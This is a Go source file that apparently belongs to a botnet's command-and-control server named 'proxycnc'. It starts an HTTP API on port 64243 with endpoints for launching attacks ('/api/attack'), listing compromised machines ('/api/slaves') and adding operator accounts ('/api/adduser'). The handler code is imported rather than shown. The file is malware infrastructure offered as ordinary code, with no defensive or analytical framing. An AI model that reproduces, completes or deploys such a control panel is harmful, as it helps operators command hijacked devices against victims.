package api

import (
	endpoints2 "cnc/core/api/endpoints"
	"cnc/core/config"
	"cnc/core/utils"

	"github.com/gin-gonic/gin"
)

func Serve() {
	if config.Config.Api.Enabled {
		gin.SetMode(gin.ReleaseMode)
		r := gin.New()
		r.Use(gin.Recovery())
		utils.Infof("Starting API server port=64243")

		api := r.Group("/api")
		api.GET("/attack", endpoints2.Attack)
		api.GET("/slaves", endpoints2.Slaves)
		api.GET("/adduser", endpoints2.Adduser)

		
		r.NoRoute(func(c *gin.Context) {
			c.JSON(404, gin.H{"message": "Not Found", "proxycnc": "1.0"})
		})

		if err := r.Run(":64243"); err != nil {
			utils.Errorf("API Server Error: %v", err)
			panic(err)
		}
	}
}
